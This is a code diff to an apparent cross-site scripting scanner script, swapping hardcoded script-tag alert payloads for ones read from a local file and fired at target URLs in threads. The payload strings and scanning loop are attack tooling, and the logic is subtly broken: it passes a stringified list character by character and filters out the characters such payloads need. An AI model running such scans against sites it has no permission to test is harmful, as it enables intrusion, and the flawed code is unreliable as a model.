@@ -93,20 +93,29 @@ if __name__ == "__main__":
 
     # print(a)
     
-    payloads=['<script\x20type="text/javascript">javascript:alert(1);</script>', 
-              '<script\x3Etype="text/javascript">javascript:alert(1);</script>']
-    
-
-    def remove_payloads():
+    # payloads=['<script\x20type="text/javascript">javascript:alert(1);</script>', 
+    #           '<script\x3Etype="text/javascript">javascript:alert(1);</script>']
             
-    # payloads = open('C:\\Users\Sumit\Downloads\payloads.txt', 'r', encoding='utf8')
-    # lines = sorted(payloads.read().split("\n"), key=len)
+    payloads = open('C:\\Users\Sumit\Downloads\payloads.txt', 'r', encoding='utf8')
+    lines = sorted(payloads.read().split("\n"), key=len)
+
+    test_list = lines
+    test_str=["'",'<','>']
+    res = []
+    for sub in test_list:
+        flag = 0
+        for ele in sub:
+            if ele in test_str:
+                flag = 1
+        if not flag:
+            res.append(sub)
+            pays= str(res)
 
 
-        for url in a:
-            with ThreadPoolExecutor() as executer:
-                result = executer.map(scan_xss, repeat(url), payloads)
-                print([x for x in result])
+    for url in a:
+        with ThreadPoolExecutor() as executer:
+            result = executer.map(scan_xss, repeat(url), pays)
+            print([x for x in result])
 
 
 
